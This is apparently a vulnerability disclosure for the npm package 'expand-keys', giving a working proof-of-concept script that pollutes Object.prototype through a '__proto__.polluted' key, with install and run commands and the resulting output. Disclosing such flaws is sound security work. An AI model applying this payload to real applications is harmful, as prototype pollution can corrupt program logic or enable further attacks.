# Description

`expand-keys` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var {expandKeys} = require("expand-keys")
console.log("Before : " + {}.polluted);
expandKeys({"__proto__.polluted": "Yes! Its Polluted"})
console.log("After : " + {}.polluted);
```


2. Execute the following commands in terminal:

```
npm i expand-keys # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
